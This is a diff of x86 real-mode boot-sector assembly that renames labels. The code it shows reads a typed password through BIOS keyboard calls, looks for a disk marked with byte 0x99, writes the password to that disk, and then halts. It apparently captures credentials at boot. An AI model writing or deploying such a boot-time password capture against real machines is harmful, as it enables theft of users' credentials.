@@ -13,11 +13,11 @@ call puts
 puts:
   lodsb
   cmp BYTE al, 0
-  je exit
+  je puts_end
     call putc
     jmp puts
-  exit:
-   ret
+  puts_end:
+    ret
 
 ; print a char to screen - used by puts
 putc:
@@ -32,10 +32,10 @@ sleep:
   mov eax, 200
   top:
     cmp eax, 5
-    jbe end
+    jbe sleep_end
     dec eax
     jmp top
-  end:
+  sleep_end:
     ret
 
 ; Assumes that dl is the disk we want to try
@@ -54,13 +54,13 @@ find_disk:
   mov al, 0x01 ; I want to read one sector
   mov cx, 0x01 ; first sector, zero-eth track
   int 0x13
-  jc done_find_disk ; carry bit is set on read error
+  jc find_disk_end ; carry bit is set on read error
     mov al, [0x8003]
     cmp al, 0x99
-    jne done_find_disk
+    jne find_disk_end
       mov BYTE [disknum], dl
-      jmp done_find_disk
-  done_find_disk:
+      jmp find_disk_end
+  find_disk_end:
     ret
 
 ; Strings
@@ -90,7 +90,7 @@ start:
     mov ah, 00h
     int 0x16
     cmp al, 13
-    je done_password
+    je readchar_end
     cmp al, 8
     je backspace
       mov [bp], BYTE al
@@ -103,8 +103,9 @@ start:
       mov [bp], BYTE 0x00
       dec bp
       jmp readchar
-    done_password:
-      biosprint checking
+    readchar_end:
+
+  biosprint checking
 
   mov bx, 0x8000 ; write sector to this part of memory
   mov dl, 0x00   ; look for our disk
@@ -119,7 +120,7 @@ start:
   ; if we found our disk, write our blanked sector with password
   ; stored to that disk
   cmp BYTE [disknum], 0x99
-  je didnt_find_disk
+  je skip_write_disk
     mov ah, 0x03 ; I want to write
     mov al, 0x01 ; I want to write one sector
     mov ch, 0x00 ; zeroeth track
@@ -128,7 +129,7 @@ start:
     mov dh, 0x00 ; zeroeth head
     mov dl, [disknum]
     int 0x13
-  didnt_find_disk:
+  skip_write_disk:
 
   jmp $
 
